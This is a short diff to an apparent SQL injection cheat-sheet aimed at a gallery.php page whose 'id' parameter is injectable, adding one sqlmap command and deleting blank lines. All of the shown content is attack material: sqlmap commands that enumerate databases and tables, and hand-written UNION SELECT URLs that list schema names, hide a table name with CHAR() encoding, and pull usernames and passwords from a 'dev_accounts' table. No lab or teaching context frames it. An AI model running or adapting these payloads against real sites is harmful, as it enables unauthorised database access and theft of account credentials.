@@ -2,6 +2,8 @@
 SQLMAP
 ======
 
+sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" --batch
+
 sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" --dbs
 
 sqlmap -u "http://XX.XX.XX.XX.com/gallery/gallery.php?id=1" -p id --tables -D gallery
@@ -25,7 +27,4 @@ http://XXXXXX.com/gallery/gallery.php?id=-1  union select 1,group_concat(table_n
 http://XXXXXX.com/gallery/gallery.php?id=-1  union select 1,group_concat(column_name),3,4,5,6 FROM information_schema.columns WHERE table_name=CHAR(100, 101, 118, 95, 97, 99, 99, 111, 117, 110, 116, 115)--
 
 http://XXXXXX.com/gallery/gallery.php?id=-1  union select 1,group_concat(username,0x3a,password),3,4,5,6 From dev_accounts--
-
-
-
 
